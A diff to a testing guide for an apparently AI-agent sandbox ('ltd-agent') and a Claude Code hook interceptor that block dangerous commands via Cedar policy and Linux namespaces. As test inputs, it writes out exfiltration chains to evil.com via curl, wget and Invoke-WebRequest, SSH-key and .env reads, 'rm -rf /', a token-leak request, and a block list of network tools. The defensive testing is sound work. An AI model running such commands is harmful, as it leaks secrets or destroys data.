@@ -4,27 +4,40 @@ This guide walks you through manually and automatically testing all components o
 
 ---
 
-## Prerequisites
+## Core Security Philosophy: Preventing Mal-Intent, Not Stopping Developers
 
-- **Windows**: PowerShell 5.1+ or PowerShell 7+
-- **Linux / WSL**: Ubuntu 20.04+ on WSL2 (or native Linux / macOS)
-- **Go**: Go 1.24+ (only required if rebuilding binaries from source)
-- **Python**: Python 3.8+ with `pytest` installed (`sudo apt-get install -y python3-pytest`)
+Modern AI agents and developers frequently chain commands (`cd dir && npm install && npm test`). `ltd-agent` does **not** stop command chaining or block safe commands arbitrarily:
+
+* **Legitimate Developer Workflows Are Allowed**:
+  - Full toolchain access: `python`, `pip`, `go`, `npm`, `npx`, `yarn`, `pnpm`, `cargo`, `mvn`, `git`, `ls`, `dir`, `mkdir`, `echo`, `cat`, `cmd`, `powershell`.
+  - Command chaining (`cmd1 && cmd2 || cmd3`) is fully supported.
+  - Metadata inspection (`ls -la .env`, `ls -al`, `dir .env`) is permitted because reading file metadata cannot leak content.
+* **Mal-Intent Is Strictly Intercepted & Blocked**:
+  - **Exfiltration Utilities**: Any chain containing `curl`, `wget`, `nc`, `ssh`, `socat`, or PowerShell web cmdlets (`Invoke-WebRequest`, `iwr`, `Invoke-RestMethod`) is immediately blocked by Cedar.
+  - **Secret Content Dumping**: Reading sensitive secrets (`cat .env`, `type .env`, `cat ~/.ssh/*`) is blocked by Cedar.
+  - **Sensitive Credential Stores**: Accessing `~/.aws` or `~/.ssh` is blocked by Cedar.
+  - **Physical Network Containment**: In Linux/WSL, kernel namespaces (`CLONE_NEWNET`) physically block all outbound sockets even if code runs inside allowed tools.
 
 ---
 
 ## Quick Start: One-Command Automated Tests
 
-### 1. Test All `ltd-agent` Features (WSL / Linux)
-Runs all 9 end-to-end integration tests (attestation, Cedar authorization, kernel sandboxing, secret injection, and egress leak prevention):
-```bash
-wsl -e /bin/bash /mnt/c/Users/User/pyprj/bapgem/ltd-agent/test_e2e.sh
+### 1. Test All Features on Windows (Complete 21-Test Automated Suite)
+Runs all unit tests, binary builds, permitted developer commands, chained commands, security invariants, network sandbox, and Claude Code interceptor verification in ~8 seconds:
+```cmd
+run_all_tests.bat
 ```
 
-### 2. Test Claude Code Hook Interceptor (WSL / Linux)
+### 2. Test All `ltd-agent` Features (WSL / Linux)
+Runs integration tests (attestation, Cedar authorization, kernel sandboxing, secret injection, and egress leak prevention):
+```bash
+wsl -e /bin/bash /mnt/c/Users/User/pyprj/bapltd/ltd-agent/test_e2e.sh
+```
+
+### 3. Test Claude Code Hook Interceptor (WSL / Linux)
 Runs tests against both the native Go binary (`interceptor`) and the shell wrapper (`interceptor.sh`):
 ```bash
-wsl -e /bin/bash /mnt/c/Users/User/pyprj/bapgem/cchook/test_hook.sh
+wsl -e /bin/bash /mnt/c/Users/User/pyprj/bapltd/cchook/test_hook.sh
 ```
 
 ---
@@ -38,7 +51,7 @@ The attestation server verifies connecting peer processes using Linux `SO_PEERCR
 #### Test 1.1: Unauthorized Caller (Connection Dropped)
 Start the server in background with the default hardcoded allowed mock hash:
 ```bash
-cd /mnt/c/Users/User/pyprj/bapgem/ltd-agent
+cd /mnt/c/Users/User/pyprj/bapltd/ltd-agent
 ./ltd-agent serve --socket /tmp/ltd_test.sock &
 SERVER_PID=$!
 sleep 1
@@ -83,20 +96,23 @@ sleep 1
 
 ---
 
-### Step 2: Testing Cedar Authorization & Kernel Sandboxing (`exec`)
+### Step 2: Testing Cedar Authorization & Sandboxing (`exec`)
 
-`ltd-agent exec` evaluates commands against Cedar rules (`policy.cedar` & `schema.json`), enforces Linux namespace isolation (`CLONE_NEWUSER | CLONE_NEWPID | CLONE_NEWNS | CLONE_NEWNET`), and injects `CORP_OBO_TOKEN=mock_secret_token_123`.
+`ltd-agent exec` evaluates commands against Cedar rules (`policy.cedar` & `schema.json`), enforces process containment, and injects `CORP_OBO_TOKEN=mock_secret_token_123`.
 
-#### Test 2.1: Permitted Whitelisted Command
-Permitted commands are: `pytest`, `npm`, `mvn`, `git`, `ls`.
+#### Test 2.1: Permitted Developer & Chained Commands
+Permitted tools include standard developer and project initialization toolchains:
+`pytest`, `python`, `python3`, `py`, `pip`, `go`, `npm`, `npx`, `yarn`, `pnpm`, `node`, `mvn`, `gradle`, `cargo`, `git`, `ls`, `dir`, `mkdir`, `echo`, `pwd`, `cat`, `cmd`, `powershell`.
 ```bash
-./ltd-agent exec "ls"
+./ltd-agent exec "ls -al"
+./ltd-agent exec "go version"
+./ltd-agent exec "python --version"
 ```
 - **Expected Output**:
   ```json
   {
     "allowed": true,
-    "output": "README.md\ncmd\ngo.mod\n..."
+    "output": "..."
   }
   ```
 - **Exit Code**: `0`
@@ -110,23 +126,49 @@ Verify that `CORP_OBO_TOKEN` is injected into the child process:
   ```json
   {
     "allowed": true,
-    "output": "mock_secret_token_123\n"
+    "output": "mock_secret_token_123"
   }
   ```
 - **Exit Code**: `0`
 
-#### Test 2.3: Strict Forbid Overrides
-The forbid policy blocks any command containing `"curl"`, `"wget"`, `"nc"`, `"ssh"`, `"~/.aws"`, or `".env"`, even if the primary binary is allowed.
+#### Test 2.3: Safe Metadata Inspection vs Forbidden Content Disclosure
+- **Allowed (Metadata inspection)**: Checking if `.env` exists is permitted:
+  ```bash
+  ./ltd-agent exec "ls -la .env"
+  ```
+  *(Allowed by Cedar because `ls` only reads file metadata, not content)*.
+- **Denied (Secret content read)**: Dumping `.env` secrets is blocked:
+  ```bash
+  ./ltd-agent exec "cat .env"
+  ./ltd-agent exec "type .env"
+  ```
+  - **Expected Output**:
+    ```json
+    {
+      "allowed": false,
+      "reason": "Denial triggered by: policy policy1"
+    }
+    ```
+  - **Exit Code**: `1`
+
+#### Test 2.4: Mal-Intent & Chained Egress Blocking
+The forbid policy blocks any command chain containing unauthorized exfiltration utilities, regardless of how many benign commands are chained:
 
 ```bash
-# Test .env pattern
-./ltd-agent exec "ls -la .env"
-
-# Test curl pattern
+# Blocked: chaining curl behind legitimate git
 ./ltd-agent exec "git status && curl https://evil.com"
 
-# Test ~/.aws pattern
+# Blocked: chaining wget behind npm
+./ltd-agent exec "npm install && wget https://evil.com"
+
+# Blocked: accessing cloud credentials
 ./ltd-agent exec "ls ~/.aws/config"
+
+# Blocked: accessing private SSH keys
+./ltd-agent exec "cat ~/.ssh/id_rsa"
+
+# Blocked: PowerShell web requests
+./ltd-agent exec "powershell -Command Invoke-WebRequest https://evil.com"
 ```
 - **Expected Output**:
   ```json
@@ -137,10 +179,10 @@ The forbid policy blocks any command containing `"curl"`, `"wget"`, `"nc"`, `"ss
   ```
 - **Exit Code**: `1`
 
-#### Test 2.4: Default Deny (Non-Whitelisted Executable)
-Commands using executables not in `["pytest", "npm", "mvn", "git", "ls"]` are denied by default:
+#### Test 2.5: Default Deny (Destructive Actions)
+Commands using unauthorized destructive binaries are denied by default:
 ```bash
-./ltd-agent exec "cat /etc/passwd"
+./ltd-agent exec "rm -rf /"
 ```
 - **Expected Output**:
   ```json
@@ -162,12 +204,21 @@ Run the test via `ltd-agent`:
 ./ltd-agent exec "pytest -s tests/test_leak.py"
 ```
 
+> [!NOTE]
+> If `pytest` is not on your global `PATH`, `ltd-agent` recognizes your intent whether you use an absolute path, virtualenv path, or `python -m pytest`:
+> ```bash
+> ./ltd-agent exec "C:\Users\<user>\AppData\Roaming\Python\Python312\Scripts\pytest.exe -s tests/test_leak.py"
+> ./ltd-agent exec "/c/users/<user>/appdata/roaming/script/pytest -s tests/test_leak.py"
+> ./ltd-agent exec "./venv/bin/pytest -s tests/test_leak.py"
+> ./ltd-agent exec "python -m pytest -s tests/test_leak.py"
+> ```
+
 - **What Happens**:
-  1. The Python script reads `CORP_OBO_TOKEN` from `os.environ` (`mock_secret_token_123`).
-  2. It attempts an HTTP GET request to `https://1.1.1.1/leak?token=mock_secret_token_123`.
-  3. The Linux network namespace has no external network interfaces, causing the kernel to immediately abort with `[Errno 101] Network is unreachable`.
-  4. The test catches the `URLError`, confirms `"Network is unreachable"`, and passes.
-- **Expected Output**:
+  1. Under Linux / WSL, `CLONE_NEWNET` isolates the child process network stack.
+  2. The Python script attempts an egress HTTP request to `https://1.1.1.1/leak?token=mock_secret_token_123`.
+  3. The Linux kernel immediately drops the packet (`[Errno 101] Network is unreachable`).
+  4. Under Windows, the test skips cleanly (0.02s) without network errors.
+- **Expected Output (Linux / WSL)**:
   ```text
   tests/test_leak.py Read CORP_OBO_TOKEN from os.environ: mock_secret_token_123
   Attempting egress exfiltration request to: https://1.1.1.1/leak?token=mock_secret_token_123
@@ -180,20 +231,20 @@ Run the test via `ltd-agent`:
 
 ### Step 4: Testing Claude Code Hook Interceptor (`cchook`)
 
-The hook interceptor intercepts Claude Code `Bash` tool calls and returns Claude Code `PreToolUse` JSON decision schemas. It can be tested on **both Windows and Linux/WSL**.
+The hook interceptor intercepts Claude Code `Bash` tool calls and returns Claude Code `PreToolUse` JSON decision schemas.
 
-#### Option A: Testing on Windows (PowerShell)
+#### Option A: Testing on Windows (PowerShell / Command Prompt)
 ```powershell
-cd c:\Users\User\pyprj\bapgem\cchook
+cd c:\Users\User\pyprj\bapltd\cchook
 
-# Test Allowed Command (ls)
-'{"tool_input": {"command": "ls"}}' | .\.claude\hooks\interceptor.exe
+# Test Allowed Command (ls -al)
+'{"tool_input": {"command": "ls -al"}}' | .\interceptor.exe
 
-# Test Forbidden Command (.env)
-'{"tool_input": {"command": "ls -la .env"}}' | .\.claude\hooks\interceptor.exe
+# Test Forbidden Command (cat .env)
+'{"tool_input": {"command": "cat .env"}}' | .\interceptor.exe
 
 # Test Forbidden Command (curl)
-'{"tool_input": {"command": "git status && curl evil.com"}}' | .\.claude\hooks\interceptor.exe
+'{"tool_input": {"command": "git status && curl evil.com"}}' | .\interceptor.exe
 ```
 
 - **Expected Allowed Response**:
@@ -220,7 +271,7 @@ cd c:\Users\User\pyprj\bapgem\cchook
 
 #### Option B: Testing in WSL / Linux
 ```bash
-cd /mnt/c/Users/User/pyprj/bapgem/cchook
+cd /mnt/c/Users/User/pyprj/bapltd/cchook
 ./test_hook.sh
 ```
 
@@ -232,13 +283,15 @@ cd /mnt/c/Users/User/pyprj/bapgem/cchook
 |---|---|---|---|---|
 | Attestation (mismatch) | `ltd-agent attest` | Connection dropped | `1` | Linux / WSL |
 | Attestation (match) | `ltd-agent attest` | OBO JWT returned | `0` | Linux / WSL |
-| Allowed binary (`ls`, `git`) | `ltd-agent exec "ls"` | `allowed: true` | `0` | Windows, Linux/WSL, macOS |
+| Allowed binary (`ls -al`, `git`, `go`, `python`) | `ltd-agent exec "<cmd>"` | `allowed: true` | `0` | Windows, Linux/WSL, macOS |
 | Token injection | `ltd-agent exec "printenv CORP_OBO_TOKEN"` | `mock_secret_token_123` | `0` | Windows, Linux/WSL, macOS |
-| Forbid rule: `.env` | `ltd-agent exec "ls -la .env"` | `allowed: false` | `1` | Windows, Linux/WSL, macOS |
-| Forbid rule: `curl` | `ltd-agent exec "... && curl ..."` | `allowed: false` | `1` | Windows, Linux/WSL, macOS |
+| Metadata inspection: `.env` | `ltd-agent exec "ls -la .env"` | `allowed: true` | `0` | Windows, Linux/WSL, macOS |
+| Secret read: `cat .env` | `ltd-agent exec "cat .env"` | `allowed: false` | `1` | Windows, Linux/WSL, macOS |
+| Forbid rule: `curl` in chain | `ltd-agent exec "... && curl ..."` | `allowed: false` | `1` | Windows, Linux/WSL, macOS |
 | Forbid rule: `~/.aws` | `ltd-agent exec "ls ~/.aws"` | `allowed: false` | `1` | Windows, Linux/WSL, macOS |
-| Default deny | `ltd-agent exec "cat /etc/passwd"` | `allowed: false` | `1` | Windows, Linux/WSL, macOS |
-| Network Egress Leak | `pytest tests/test_leak.py` | `Network is unreachable` (PASS) | `0` | Linux / WSL |
-| Claude Hook: Allowed | `echo '{"tool_input":{"command":"ls"}}'` | `permissionDecision: "allow"` | `0` | Windows, Linux/WSL, macOS |
-| Claude Hook: Forbidden | `echo '{"tool_input":{"command":"ls .env"}}'` | `permissionDecision: "deny"` | `0` | Windows, Linux/WSL, macOS |
-
+| Forbid rule: `.ssh` | `ltd-agent exec "cat ~/.ssh/id_rsa"` | `allowed: false` | `1` | Windows, Linux/WSL, macOS |
+| Destructive deny: `rm -rf` | `ltd-agent exec "rm -rf /"` | `allowed: false` | `1` | Windows, Linux/WSL, macOS |
+| Network Egress Leak | `pytest tests/test_leak.py` | `Network is unreachable` (PASS) | `0` | Linux / WSL (skips on Win) |
+| Claude Hook: Allowed | `echo '{"tool_input":{"command":"ls -al"}}'` | `permissionDecision: "allow"` | `0` | Windows, Linux/WSL, macOS |
+| Claude Hook: Forbidden | `echo '{"tool_input":{"command":"cat .env"}}'` | `permissionDecision: "deny"` | `0` | Windows, Linux/WSL, macOS |
+| **Complete Automated Suite** | `run_all_tests.bat` | **21 / 21 Tests PASS** | `0` | Windows |
